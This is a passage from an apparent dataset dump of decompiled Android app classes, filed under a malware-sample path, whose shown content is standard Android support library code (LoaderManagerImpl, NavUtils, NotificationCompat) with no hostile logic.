this.mHaveData && needReset) {         if (LoaderManagerImpl.DEBUG) {           Log.v(LoaderManagerImpl.TAG,""  Reseting: "" + this);         }         String lastBecause=null;         if (LoaderManagerImpl.this.mActivity != null) {           lastBecause=LoaderManagerImpl.this.mActivity.mFragments.mNoTransactionsBecause;           LoaderManagerImpl.this.mActivity.mFragments.mNoTransactionsBecause=""onLoaderReset"";         }         try {           this.mCallbacks.onLoaderReset(this.mLoader);         }   finally {           if (LoaderManagerImpl.this.mActivity != null) {             LoaderManagerImpl.this.mActivity.mFragments.mNoTransactionsBecause=lastBecause;           }         }       }       this.mCallbacks=null;       this.mData=null;       this.mHaveData=false;       if (this.mLoader != null) {         if (this.mListenerRegistered) {           this.mListenerRegistered=false;           this.mLoader.unregisterListener(this);         }         this.mLoader.reset();       }       if (this.mPendingLoader != null) {         this.mPendingLoader.destroy();       }     }     @Override public void onLoadComplete(    Loader<Object> loader,    Object data){       if (LoaderManagerImpl.DEBUG) {         Log.v(LoaderManagerImpl.TAG,""onLoadComplete: "" + this);       }       if (this.mDestroyed) {         if (LoaderManagerImpl.DEBUG) {           Log.v(LoaderManagerImpl.TAG,""  Ignoring load complete -- destroyed"");           return;         }         return;       }       if (LoaderManagerImpl.this.mLoaders.get(this.mId) != this) {         if (LoaderManagerImpl.DEBUG) {           Log.v(LoaderManagerImpl.TAG,""  Ignoring load complete -- not active"");           return;         }         return;       }       LoaderInfo pending=this.mPendingLoader;       if (pending != null) {         if (LoaderManagerImpl.DEBUG) {           Log.v(LoaderManagerImpl.TAG,""  Switching to pending loader: "" + pending);         }         this.mPendingLoader=null;         LoaderManagerImpl.this.mLoaders.put(this.mId,null);         destroy();         LoaderManagerImpl.this.installLoader(pending);         return;       }       if (this.mData != data || !this.mHaveData) {         this.mData=data;         this.mHaveData=true;         if (this.mStarted) {           callOnLoadFinished(loader,data);         }       }       LoaderInfo info=LoaderManagerImpl.this.mInactiveLoaders.get(this.mId);       if (info != null && info != this) {         info.mDeliveredData=false;         info.destroy();         LoaderManagerImpl.this.mInactiveLoaders.remove(this.mId);       }       if (LoaderManagerImpl.this.mActivity != null && !LoaderManagerImpl.this.hasRunningLoaders()) {         LoaderManagerImpl.this.mActivity.mFragments.startPendingDeferredFragments();       }     }     void callOnLoadFinished(    Loader<Object> loader,    Object data){       if (this.mCallbacks != null) {         String lastBecause=null;         if (LoaderManagerImpl.this.mActivity != null) {           lastBecause=LoaderManagerImpl.this.mActivity.mFragments.mNoTransactionsBecause;           LoaderManagerImpl.this.mActivity.mFragments.mNoTransactionsBecause=""onLoadFinished"";         }         try {           if (LoaderManagerImpl.DEBUG) {             Log.v(LoaderManagerImpl.TAG,""  onLoadFinished in "" + loader + "": ""+ loader.dataToString(data));           }           this.mCallbacks.onLoadFinished(loader,data);           this.mDeliveredData=true;         }   finally {           if (LoaderManagerImpl.this.mActivity != null) {             LoaderManagerImpl.this.mActivity.mFragments.mNoTransactionsBecause=lastBecause;           }         }       }     }     public String toString(){       StringBuilder sb=new StringBuilder(64);       sb.append(""LoaderInfo{"");       sb.append(Integer.toHexString(System.identityHashCode(this)));       sb.append("" #"");       sb.append(this.mId);       sb.append("" : "");       DebugUtils.buildShortClassTag(this.mLoader,sb);       sb.append(""}}"");       return sb.toString();     }     public void dump(    String prefix,    FileDescriptor fd,    PrintWriter writer,    String[] args){       writer.print(prefix);       writer.print(""mId="");       writer.print(this.mId);       writer.print("" mArgs="");       writer.println(this.mArgs);       writer.print(prefix);       writer.print(""mCallbacks="");       writer.println(this.mCallbacks);       writer.print(prefix);       writer.print(""mLoader="");       writer.println(this.mLoader);       if (this.mLoader != null) {         this.mLoader.dump(prefix + ""  "",fd,writer,args);       }       if (this.mHaveData || this.mDeliveredData) {         writer.print(prefix);         writer.print(""mHaveData="");         writer.print(this.mHaveData);         writer.print(""  mDeliveredData="");         writer.println(this.mDeliveredData);         writer.print(prefix);         writer.print(""mData="");         writer.println(this.mData);       }       writer.print(prefix);       writer.print(""mStarted="");       writer.print(this.mStarted);       writer.print("" mReportNextStart="");       writer.print(this.mReportNextStart);       writer.print("" mDestroyed="");       writer.println(this.mDestroyed);       writer.print(prefix);       writer.print(""mRetaining="");       writer.print(this.mRetaining);       writer.print("" mRetainingStarted="");       writer.print(this.mRetainingStarted);       writer.print("" mListenerRegistered="");       writer.println(this.mListenerRegistered);       if (this.mPendingLoader != null) {         writer.print(prefix);         writer.println(""Pending Loader "");         writer.print(this.mPendingLoader);         writer.println("":"");         this.mPendingLoader.dump(prefix + ""  "",fd,writer,args);       }     }   }   public LoaderManagerImpl(  String who,  FragmentActivity activity,  boolean started){     this.mWho=who;     this.mActivity=activity;     this.mStarted=started;   }   public void updateActivity(  FragmentActivity activity){     this.mActivity=activity;   }   private LoaderInfo createLoader(  int id,  Bundle args,  LoaderManager.LoaderCallbacks<Object> callback){     LoaderInfo info=new LoaderInfo(id,args,callback);     Loader<Object> loader=callback.onCreateLoader(id,args);     info.mLoader=loader;     return info;   }   private LoaderInfo createAndInstallLoader(  int id,  Bundle args,  LoaderManager.LoaderCallbacks<Object> callback){     try {       this.mCreatingLoader=true;       LoaderInfo info=createLoader(id,args,callback);       installLoader(info);       return info;     }   finally {       this.mCreatingLoader=false;     }   }   void installLoader(  LoaderInfo info){     this.mLoaders.put(info.mId,info);     if (this.mStarted) {       info.start();     }   }   @Override public <D>Loader<D> initLoader(  int i,  Bundle bundle,  LoaderManager.LoaderCallbacks<D> loaderCallbacks){     if (this.mCreatingLoader) {       throw new IllegalStateException(""Called while creating a loader"");     }     LoaderInfo loaderInfo=this.mLoaders.get(i);     if (DEBUG) {       Log.v(TAG,""initLoader in "" + this + "": args=""+ bundle);     }     if (loaderInfo == null) {       loaderInfo=createAndInstallLoader(i,bundle,loaderCallbacks);       if (DEBUG) {         Log.v(TAG,""  Created new loader "" + loaderInfo);       }     }  else {       if (DEBUG) {         Log.v(TAG,""  Re-using existing loader "" + loaderInfo);       }       loaderInfo.mCallbacks=loaderCallbacks;     }     if (loaderInfo.mHaveData && this.mStarted) {       loaderInfo.callOnLoadFinished(loaderInfo.mLoader,loaderInfo.mData);     }     return (Loader<D>)loaderInfo.mLoader;   }   @Override public <D>Loader<D> restartLoader(  int i,  Bundle bundle,  LoaderManager.LoaderCallbacks<D> loaderCallbacks){     if (this.mCreatingLoader) {       throw new IllegalStateException(""Called while creating a loader"");     }     LoaderInfo loaderInfo=this.mLoaders.get(i);     if (DEBUG) {       Log.v(TAG,""restartLoader in "" + this + "": args=""+ bundle);     }     if (loaderInfo != null) {       LoaderInfo loaderInfo2=this.mInactiveLoaders.get(i);       if (loaderInfo2 != null) {         if (loaderInfo.mHaveData) {           if (DEBUG) {             Log.v(TAG,""  Removing last inactive loader: "" + loaderInfo);           }           loaderInfo2.mDeliveredData=false;           loaderInfo2.destroy();           loaderInfo.mLoader.abandon();           this.mInactiveLoaders.put(i,loaderInfo);         }  else         if (!loaderInfo.mStarted) {           if (DEBUG) {             Log.v(TAG,""  Current loader is stopped; replacing"");           }           this.mLoaders.put(i,null);           loaderInfo.destroy();         }  else {           if (loaderInfo.mPendingLoader != null) {             if (DEBUG) {               Log.v(TAG,""  Removing pending loader: "" + loaderInfo.mPendingLoader);             }             loaderInfo.mPendingLoader.destroy();             loaderInfo.mPendingLoader=null;           }           if (DEBUG) {             Log.v(TAG,""  Enqueuing as new pending loader"");           }           loaderInfo.mPendingLoader=createLoader(i,bundle,loaderCallbacks);           return (Loader<D>)loaderInfo.mPendingLoader.mLoader;         }       }  else {         if (DEBUG) {           Log.v(TAG,""  Making last loader inactive: "" + loaderInfo);         }         loaderInfo.mLoader.abandon();         this.mInactiveLoaders.put(i,loaderInfo);       }     }     return (Loader<D>)createAndInstallLoader(i,bundle,loaderCallbacks).mLoader;   }   @Override public void destroyLoader(  int id){     if (this.mCreatingLoader) {       throw new IllegalStateException(""Called while creating a loader"");     }     if (DEBUG) {       Log.v(TAG,""destroyLoader in "" + this + "" of ""+ id);     }     int idx=this.mLoaders.indexOfKey(id);     if (idx >= 0) {       LoaderInfo info=this.mLoaders.valueAt(idx);       this.mLoaders.removeAt(idx);       info.destroy();     }     int idx2=this.mInactiveLoaders.indexOfKey(id);     if (idx2 >= 0) {       LoaderInfo info2=this.mInactiveLoaders.valueAt(idx2);       this.mInactiveLoaders.removeAt(idx2);       info2.destroy();     }     if (this.mActivity != null && !hasRunningLoaders()) {       this.mActivity.mFragments.startPendingDeferredFragments();     }   }   @Override public <D>Loader<D> getLoader(  int i){     if (this.mCreatingLoader) {       throw new IllegalStateException(""Called while creating a loader"");     }     LoaderInfo loaderInfo=this.mLoaders.get(i);     if (loaderInfo != null) {       if (loaderInfo.mPendingLoader != null) {         return (Loader<D>)loaderInfo.mPendingLoader.mLoader;       }       return (Loader<D>)loaderInfo.mLoader;     }     return null;   }   public void doStart(){     if (DEBUG) {       Log.v(TAG,""Starting in "" + this);     }     if (this.mStarted) {       RuntimeException e=new RuntimeException(""here"");       e.fillInStackTrace();       Log.w(TAG,""Called doStart when already started: "" + this,e);     }  else {       this.mStarted=true;       for (int i=this.mLoaders.size() - 1; i >= 0; i--) {         this.mLoaders.valueAt(i).start();       }     }   }   public void doStop(){     if (DEBUG) {       Log.v(TAG,""Stopping in "" + this);     }     if (!this.mStarted) {       RuntimeException e=new RuntimeException(""here"");       e.fillInStackTrace();       Log.w(TAG,""Called doStop when not started: "" + this,e);     }  else {       for (int i=this.mLoaders.size() - 1; i >= 0; i--) {         this.mLoaders.valueAt(i).stop();       }       this.mStarted=false;     }   }   public void doRetain(){     if (DEBUG) {       Log.v(TAG,""Retaining in "" + this);     }     if (!this.mStarted) {       RuntimeException e=new RuntimeException(""here"");       e.fillInStackTrace();       Log.w(TAG,""Called doRetain when not started: "" + this,e);     }  else {       this.mRetaining=true;       this.mStarted=false;       for (int i=this.mLoaders.size() - 1; i >= 0; i--) {         this.mLoaders.valueAt(i).retain();       }     }   }   public void finishRetain(){     if (this.mRetaining) {       if (DEBUG) {         Log.v(TAG,""Finished Retaining in "" + this);       }       this.mRetaining=false;       for (int i=this.mLoaders.size() - 1; i >= 0; i--) {         this.mLoaders.valueAt(i).finishRetain();       }     }   }   public void doReportNextStart(){     for (int i=this.mLoaders.size() - 1; i >= 0; i--) {       this.mLoaders.valueAt(i).mReportNextStart=true;     }   }   public void doReportStart(){     for (int i=this.mLoaders.size() - 1; i >= 0; i--) {       this.mLoaders.valueAt(i).reportStart();     }   }   public void doDestroy(){     if (!this.mRetaining) {       if (DEBUG) {         Log.v(TAG,""Destroying Active in "" + this);       }       for (int i=this.mLoaders.size() - 1; i >= 0; i--) {         this.mLoaders.valueAt(i).destroy();       }     }     if (DEBUG) {       Log.v(TAG,""Destroying Inactive in "" + this);     }     for (int i2=this.mInactiveLoaders.size() - 1; i2 >= 0; i2--) {       this.mInactiveLoaders.valueAt(i2).destroy();     }     this.mInactiveLoaders.clear();   }   public String toString(){     StringBuilder sb=new StringBuilder(128);     sb.append(""LoaderManager{"");     sb.append(Integer.toHexString(System.identityHashCode(this)));     sb.append("" in "");     DebugUtils.buildShortClassTag(this.mActivity,sb);     sb.append(""}}"");     return sb.toString();   }   @Override public void dump(  String prefix,  FileDescriptor fd,  PrintWriter writer,  String[] args){     if (this.mLoaders.size() > 0) {       writer.print(prefix);       writer.println(""Active Loaders:"");       String innerPrefix=prefix + ""    "";       for (int i=0; i < this.mLoaders.size(); i++) {         LoaderInfo li=this.mLoaders.valueAt(i);         writer.print(prefix);         writer.print(""  #"");         writer.print(this.mLoaders.keyAt(i));         writer.print("": "");         writer.println(li.toString());         li.dump(innerPrefix,fd,writer,args);       }     }     if (this.mInactiveLoaders.size() > 0) {       writer.print(prefix);       writer.println(""Inactive Loaders:"");       String innerPrefix2=prefix + ""    "";       for (int i2=0; i2 < this.mInactiveLoaders.size(); i2++) {         LoaderInfo li2=this.mInactiveLoaders.valueAt(i2);         writer.print(prefix);         writer.print(""  #"");         writer.print(this.mInactiveLoaders.keyAt(i2));         writer.print("": "");         writer.println(li2.toString());         li2.dump(innerPrefix2,fd,writer,args);       }     }   }   @Override public boolean hasRunningLoaders(){     boolean loadersRunning=false;     int count=this.mLoaders.size();     for (int i=0; i < count; i++) {       LoaderInfo li=this.mLoaders.valueAt(i);       loadersRunning|=li.mStarted && !li.mDeliveredData;     }     return loadersRunning;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.app\NavUtils.code","public class NavUtils {   private static final NavUtilsImpl IMPL;   public static final String PARENT_ACTIVITY=""android.support.PARENT_ACTIVITY"";   private static final String TAG=""NavUtils""; public interface NavUtilsImpl {     Intent getParentActivityIntent(    Activity activity);     String getParentActivityName(    Context context,    ActivityInfo activityInfo);     void navigateUpTo(    Activity activity,    Intent intent);     boolean shouldUpRecreateTask(    Activity activity,    Intent intent);   } public static class NavUtilsImplBase implements NavUtilsImpl {     NavUtilsImplBase(){     }     @Override public Intent getParentActivityIntent(    Activity activity){       Intent parentIntent=null;       String parentName=NavUtils.getParentActivityName(activity);       if (parentName != null) {         ComponentName target=new ComponentName(activity,parentName);         try {           String grandparent=NavUtils.getParentActivityName(activity,target);           parentIntent=grandparent == null ? IntentCompat.makeMainActivity(target) : new Intent().setComponent(target);         }  catch (        PackageManager.NameNotFoundException e) {           Log.e(NavUtils.TAG,""getParentActivityIntent: bad parentActivityName '"" + parentName + ""' in manifest"");         }       }       return parentIntent;     }     @Override public boolean shouldUpRecreateTask(    Activity activity,    Intent targetIntent){       String action=activity.getIntent().getAction();       return (action == null || action.equals(""android.intent.action.MAIN"")) ? false : true;     }     @Override public void navigateUpTo(    Activity activity,    Intent upIntent){       upIntent.addFlags(67108864);       activity.startActivity(upIntent);       activity.finish();     }     @Override public String getParentActivityName(    Context context,    ActivityInfo info){       String parentActivity;       if (info.metaData != null && (parentActivity=info.metaData.getString(NavUtils.PARENT_ACTIVITY)) != null) {         if (parentActivity.charAt(0) == '.') {           return context.getPackageName() + parentActivity;         }         return parentActivity;       }       return null;     }   } static class NavUtilsImplJB extends NavUtilsImplBase {     NavUtilsImplJB(){     }     @Override public Intent getParentActivityIntent(    Activity activity){       Intent result=NavUtilsJB.getParentActivityIntent(activity);       if (result == null) {         return superGetParentActivityIntent(activity);       }       return result;     }     Intent superGetParentActivityIntent(    Activity activity){       return super.getParentActivityIntent(activity);     }     @Override public boolean shouldUpRecreateTask(    Activity activity,    Intent targetIntent){       return NavUtilsJB.shouldUpRecreateTask(activity,targetIntent);     }     @Override public void navigateUpTo(    Activity activity,    Intent upIntent){       NavUtilsJB.navigateUpTo(activity,upIntent);     }     @Override public String getParentActivityName(    Context context,    ActivityInfo info){       String result=NavUtilsJB.getParentActivityName(info);       if (result == null) {         return super.getParentActivityName(context,info);       }       return result;     }   } static {     int version=Build.VERSION.SDK_INT;     if (version >= 16) {       IMPL=new NavUtilsImplJB();     }  else {       IMPL=new NavUtilsImplBase();     }   }   public static boolean shouldUpRecreateTask(  Activity sourceActivity,  Intent targetIntent){     return IMPL.shouldUpRecreateTask(sourceActivity,targetIntent);   }   public static void navigateUpFromSameTask(  Activity sourceActivity){     Intent upIntent=getParentActivityIntent(sourceActivity);     if (upIntent == null) {       throw new IllegalArgumentException(""Activity "" + sourceActivity.getClass().getSimpleName() + "" does not have a parent activity name specified. (Did you forget to add the android.support.PARENT_ACTIVITY <meta-data>  element in your manifest?)"");     }     navigateUpTo(sourceActivity,upIntent);   }   public static void navigateUpTo(  Activity sourceActivity,  Intent upIntent){     IMPL.navigateUpTo(sourceActivity,upIntent);   }   public static Intent getParentActivityIntent(  Activity sourceActivity){     return IMPL.getParentActivityIntent(sourceActivity);   }   public static Intent getParentActivityIntent(  Context context,  Class<?> sourceActivityClass) throws PackageManager.NameNotFoundException {     String parentActivity=getParentActivityName(context,new ComponentName(context,sourceActivityClass));     if (parentActivity == null) {       return null;     }     ComponentName target=new ComponentName(context,parentActivity);     String grandparent=getParentActivityName(context,target);     return grandparent == null ? IntentCompat.makeMainActivity(target) : new Intent().setComponent(target);   }   public static Intent getParentActivityIntent(  Context context,  ComponentName componentName) throws PackageManager.NameNotFoundException {     String parentActivity=getParentActivityName(context,componentName);     if (parentActivity == null) {       return null;     }     ComponentName target=new ComponentName(componentName.getPackageName(),parentActivity);     String grandparent=getParentActivityName(context,target);     return grandparent == null ? IntentCompat.makeMainActivity(target) : new Intent().setComponent(target);   }   public static String getParentActivityName(  Activity sourceActivity){     try {       return getParentActivityName(sourceActivity,sourceActivity.getComponentName());     }  catch (    PackageManager.NameNotFoundException e) {       throw new IllegalArgumentException(e);     }   }   public static String getParentActivityName(  Context context,  ComponentName componentName) throws PackageManager.NameNotFoundException {     PackageManager pm=context.getPackageManager();     ActivityInfo info=pm.getActivityInfo(componentName,128);     String parentActivity=IMPL.getParentActivityName(context,info);     return parentActivity;   }   private NavUtils(){   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.app\NavUtilsImpl.code","public interface NavUtilsImpl {   Intent getParentActivityIntent(  Activity activity);   String getParentActivityName(  Context context,  ActivityInfo activityInfo);   void navigateUpTo(  Activity activity,  Intent intent);   boolean shouldUpRecreateTask(  Activity activity,  Intent intent); } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.app\NavUtilsImplBase.code","public static class NavUtilsImplBase implements NavUtilsImpl {   NavUtilsImplBase(){   }   @Override public Intent getParentActivityIntent(  Activity activity){     Intent parentIntent=null;     String parentName=NavUtils.getParentActivityName(activity);     if (parentName != null) {       ComponentName target=new ComponentName(activity,parentName);       try {         String grandparent=NavUtils.getParentActivityName(activity,target);         parentIntent=grandparent == null ? IntentCompat.makeMainActivity(target) : new Intent().setComponent(target);       }  catch (      PackageManager.NameNotFoundException e) {         Log.e(NavUtils.TAG,""getParentActivityIntent: bad parentActivityName '"" + parentName + ""' in manifest"");       }     }     return parentIntent;   }   @Override public boolean shouldUpRecreateTask(  Activity activity,  Intent targetIntent){     String action=activity.getIntent().getAction();     return (action == null || action.equals(""android.intent.action.MAIN"")) ? false : true;   }   @Override public void navigateUpTo(  Activity activity,  Intent upIntent){     upIntent.addFlags(67108864);     activity.startActivity(upIntent);     activity.finish();   }   @Override public String getParentActivityName(  Context context,  ActivityInfo info){     String parentActivity;     if (info.metaData != null && (parentActivity=info.metaData.getString(NavUtils.PARENT_ACTIVITY)) != null) {       if (parentActivity.charAt(0) == '.') {         return context.getPackageName() + parentActivity;       }       return parentActivity;     }     return null;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.app\NavUtilsImplJB.code","static class NavUtilsImplJB extends NavUtilsImplBase {   NavUtilsImplJB(){   }   @Override public Intent getParentActivityIntent(  Activity activity){     Intent result=NavUtilsJB.getParentActivityIntent(activity);     if (result == null) {       return superGetParentActivityIntent(activity);     }     return result;   }   Intent superGetParentActivityIntent(  Activity activity){     return super.getParentActivityIntent(activity);   }   @Override public boolean shouldUpRecreateTask(  Activity activity,  Intent targetIntent){     return NavUtilsJB.shouldUpRecreateTask(activity,targetIntent);   }   @Override public void navigateUpTo(  Activity activity,  Intent upIntent){     NavUtilsJB.navigateUpTo(activity,upIntent);   }   @Override public String getParentActivityName(  Context context,  ActivityInfo info){     String result=NavUtilsJB.getParentActivityName(info);     if (result == null) {       return super.getParentActivityName(context,info);     }     return result;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.app\NavUtilsJB.code","class NavUtilsJB {   NavUtilsJB(){   }   public static Intent getParentActivityIntent(  Activity activity){     return activity.getParentActivityIntent();   }   public static boolean shouldUpRecreateTask(  Activity activity,  Intent targetIntent){     return activity.shouldUpRecreateTask(targetIntent);   }   public static void navigateUpTo(  Activity activity,  Intent upIntent){     activity.navigateUpTo(upIntent);   }   public static String getParentActivityName(  ActivityInfo info){     return info.parentActivityName;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.app\NonConfigurationInstances.code","static final class NonConfigurationInstances {   Object activity;   HashMap<String,Object> children;   Object custom;   ArrayList<Fragment> fragments;   HashMap<String,LoaderManagerImpl> loaders;   NonConfigurationInstances(){   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.app\NoSaveStateFrameLayout.code","class NoSaveStateFrameLayout extends FrameLayout {   public static ViewGroup wrap(  View child){     NoSaveStateFrameLayout wrapper=new NoSaveStateFrameLayout(child.getContext());     ViewGroup.LayoutParams childParams=child.getLayoutParams();     if (childParams != null) {       wrapper.setLayoutParams(childParams);     }     FrameLayout.LayoutParams lp=new FrameLayout.LayoutParams(-1,-1);     child.setLayoutParams(lp);     wrapper.addView(child);     return wrapper;   }   public NoSaveStateFrameLayout(  Context context){     super(context);   }   @Override protected void dispatchSaveInstanceState(  SparseArray<Parcelable> container){     dispatchFreezeSelfOnly(container);   }   @Override protected void dispatchRestoreInstanceState(  SparseArray<Parcelable> container){     dispatchThawSelfOnly(container);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.app\NotificationCompat.code","public class NotificationCompat {   public static final int FLAG_HIGH_PRIORITY=128;   private static final NotificationCompatImpl IMPL;   public static final int PRIORITY_DEFAULT=0;   public static final int PRIORITY_HIGH=1;   public static final int PRIORITY_LOW=-1;   public static final int PRIORITY_MAX=2;   public static final int PRIORITY_MIN=-2; public interface NotificationCompatImpl {     Notification build(    Builder builder);   } static class NotificationCompatImplBase implements NotificationCompatImpl {     NotificationCompatImplBase(){     }     @Override public Notification build(    Builder b){       Notification result=b.mNotification;       result.setLatestEventInfo(b.mContext,b.mContentTitle,b.mContentText,b.mContentIntent);       if (b.mPriority > 0) {         result.flags|=128;       }       return result;     }   } static class NotificationCompatImplHoneycomb implements NotificationCompatImpl {     NotificationCompatImplHoneycomb(){     }     @Override public Notification build(    Builder b){       return NotificationCompatHoneycomb.add(b.mContext,b.mNotification,b.mContentTitle,b.mContentText,b.mContentInfo,b.mTickerView,b.mNumber,b.mContentIntent,b.mFullScreenIntent,b.mLargeIcon);     }   } static class NotificationCompatImplIceCreamSandwich implements NotificationCompatImpl {     NotificationCompatImplIceCreamSandwich(){     }     @Override public Notification build(    Builder b){       return NotificationCompatIceCreamSandwich.add(b.mContext,b.mNotification,b.mContentTitle,b.mContentText,b.mContentInfo,b.mTickerView,b.mNumber,b.mContentIntent,b.mFullScreenIntent,b.mLargeIcon,b.mProgressMax,b.mProgress,b.mProgressIndeterminate);     }   } static class NotificationCompatImplJellybean implements NotificationCompatImpl {     NotificationCompatImplJellybean(){     }     @Override public Notification build(    Builder b){       NotificationCompatJellybean jbBuilder=new NotificationCompatJellybean(b.mContext,b.mNotification,b.mContentTitle,b.mContentText,b.mContentInfo,b.mTickerView,b.mNumber,b.mContentIntent,b.mFullScreenIntent,b.mLargeIcon,b.mProgressMax,b.mProgress,b.mProgressIndeterminate,b.mUseChronometer,b.mPriority,b.mSubText);       Iterator i$=b.mActions.iterator();       while (i$.hasNext()) {         Action action=i$.next();         jbBuilder.addAction(action.icon,action.title,action.actionIntent);       }       if (b.mStyle != null) {         if (b.mStyle instanceof BigTextStyle) {           BigTextStyle style=(BigTextStyle)b.mStyle;           jbBuilder.addBigTextStyle(style.mBigContentTitle,style.mSummaryTextSet,style.mSummaryText,style.mBigText);         }  else         if (b.mStyle instanceof InboxStyle) {           InboxStyle style2=(InboxStyle)b.mStyle;           jbBuilder.addInboxStyle(style2.mBigContentTitle,style2.mSummaryTextSet,style2.mSummaryText,style2.mTexts);         }  else         if (b.mStyle instanceof BigPictureStyle) {           BigPictureStyle style3=(BigPictureStyle)b.mStyle;           jbBuilder.addBigPictureStyle(style3.mBigContentTitle,style3.mSummaryTextSet,style3.mSummaryText,style3.mPicture);         }       }       return jbBuilder.build();     }   } static {     if (Build.VERSION.SDK_INT >= 16) {       IMPL=new NotificationCompatImplJellybean();       return;     }     if (Build.VERSION.SDK_INT >= 14) {       IMPL=new NotificationCompatImplIceCreamSandwich();     }  else     if (Build.VERSION.SDK_INT >= 11) {       IMPL=new NotificationCompatImplHoneycomb();     }  else {       IMPL=new NotificationCompatImplBase();     }   } public static class Builder {     CharSequence mContentInfo;     PendingIntent mContentIntent;     CharSequence mContentText;     CharSequence mContentTitle;     Context mContext;     PendingIntent mFullScreenIntent;     Bitmap mLargeIcon;     int mNumber;     int mPriority;     int mProgress;     boolean mProgressIndeterminate;     int mProgressMax;     Style mStyle;     CharSequence mSubText;     RemoteViews mTickerView;     boolean mUseChronometer;     ArrayList<Action> mActions=new ArrayList<>();     Notification mNotification=new Notification();     public Builder(    Context context){       this.mContext=context;       this.mNotification.when=System.currentTimeMillis();       this.mNotification.audioStreamType=-1;       this.mPriority=0;     }     public Builder setWhen(    long when){       this.mNotification.when=when;       return this;     }     public Builder setUsesChronometer(    boolean b){       this.mUseChronometer=b;       return this;     }     public Builder setSmallIcon(    int icon){       this.mNotification.icon=icon;       return this;     }     public Builder setSmallIcon(    int icon,    int level){       this.mNotification.icon=icon;       this.mNotification.iconLevel=level;       return this;     }     public Builder setContentTitle(    CharSequence title){       this.mContentTitle=title;       return this;     }     public Builder setContentText(    CharSequence text){       this.mContentText=text;       return this;     }     public Builder setSubText(    CharSequence text){       this.mSubText=text;       return this;     }     public Builder setNumber(    int number){       this.mNumber=number;       return this;     }     public Builder setContentInfo(    CharSequence info){       this.mContentInfo=info;       return this;     }     public Builder setProgress(    int max,    int progress,    boolean indeterminate){       this.mProgressMax=max;       this.mProgress=progress;       this.mProgressIndeterminate=indeterminate;       return this;     }     public Builder setContent(    RemoteViews views){       this.mNotification.contentView=views;       return this;     }     public Builder setContentIntent(    PendingIntent intent){       this.mContentIntent=intent;       return this;     }     public Builder setDeleteIntent(    PendingIntent intent){       this.mNotification.deleteIntent=intent;       return this;     }     public Builder setFullScreenIntent(    PendingIntent intent,    boolean highPriority){       this.mFullScreenIntent=intent;       setFlag(128,highPriority);       return this;     }     public Builder setTicker(    CharSequence tickerText){       this.mNotification.tickerText=tickerText;       return this;     }     public Builder setTicker(    CharSequence tickerText,    RemoteViews views){       this.mNotification.tickerText=tickerText;       this.mTickerView=views;       return this;     }     public Builder setLargeIcon(    Bitmap icon){       this.mLargeIcon=icon;       return this;     }     public Builder setSound(    Uri sound){       this.mNotification.sound=sound;       this.mNotification.audioStreamType=-1;       return this;     }     public Builder setSound(    Uri sound,    int streamType){       this.mNotification.sound=sound;       this.mNotification.audioStreamType=streamType;       return this;     }     public Builder setVibrate(    long[] pattern){       this.mNotification.vibrate=pattern;       return this;     }     public Builder setLights(    int argb,    int onMs,    int offMs){       this.mNotification.ledARGB=argb;       this.mNotification.ledOnMS=onMs;       this.mNotification.ledOffMS=offMs;       boolean showLights=(this.mNotification.ledOnMS == 0 || this.mNotification.ledOffMS == 0) ? false : true;       this.mNotification.flags=(showLights ? 1 : 0) | (this.mNotification.flags & (-2));       return this;     }     public Builder setOngoing(    boolean ongoing){       setFlag(2,ongoing);       return this;     }     public Builder setOnlyAlertOnce(    boolean onlyAlertOnce){       setFlag(8,onlyAlertOnce);       return this;     }     public Builder setAutoCancel(    boolean autoCancel){       setFlag(16,autoCancel);       return this;     }     public Builder setDefaults(    int defaults){       this.mNotification.defaults=defaults;       if ((defaults & 4) != 0) {         this.mNotification.flags|=1;       }       return this;     }     private void setFlag(    int mask,    boolean value){       if (value) {         this.mNotification.flags|=mask;       }  else {         this.mNotification.flags&=mask ^ (-1);       }     }     public Builder setPriority(    int pri){       this.mPriority=pri;       return this;     }     public Builder addAction(    int icon,    CharSequence title,    PendingIntent intent){       this.mActions.add(new Action(icon,title,intent));       return this;     }     public Builder setStyle(    Style style){       if (this.mStyle != style) {         this.mStyle=style;         if (this.mStyle != null) {           this.mStyle.setBuilder(this);         }       }       return this;     }     @Deprecated public Notification getNotification(){       return NotificationCompat.IMPL.build(this);     }     public Notification build(){       return NotificationCompat.IMPL.build(this);     }   } public static abstract class Style {     CharSequence mBigContentTitle;     Builder mBuilder;     CharSequence mSummaryText;     boolean mSummaryTextSet=false;     public void setBuilder(    Builder builder){       if (this.mBuilder != builder) {         this.mBuilder=builder;         if (this.mBuilder != null) {           this.mBuilder.setStyle(this);         }       }     }     public Notification build(){       if (this.mBuilder == null) {         return null;       }       Notification notification=this.mBuilder.build();       return notification;     }   } public static class BigPictureStyle extends Style {     Bitmap mPicture;     public BigPictureStyle(){     }     public BigPictureStyle(    Builder builder){       setBuilder(builder);     }     public BigPictureStyle setBigContentTitle(    CharSequence title){       this.mBigContentTitle=title;       return this;     }     public BigPictureStyle setSummaryText(    CharSequence cs){       this.mSummaryText=cs;       this.mSummaryTextSet=true;       return this;     }     public BigPictureStyle bigPicture(    Bitmap b){       this.mPicture=b;       return this;     }   } public static class BigTextStyle extends Style {     CharSequence mBigText;     public BigTextStyle(){     }     public BigTextStyle(    Builder builder){       setBuilder(builder);     }     public BigTextStyle setBigContentTitle(    CharSequence title){       this.mBigContentTitle=title;       return this;     }     public BigTextStyle setSummaryText(    CharSequence cs){       this.mSummaryText=cs;       this.mSummaryTextSet=true;       return this;     }     public BigTextStyle bigText(    CharSequence cs){       this.mBigText=cs;       return this;     }   } public static class InboxStyle extends 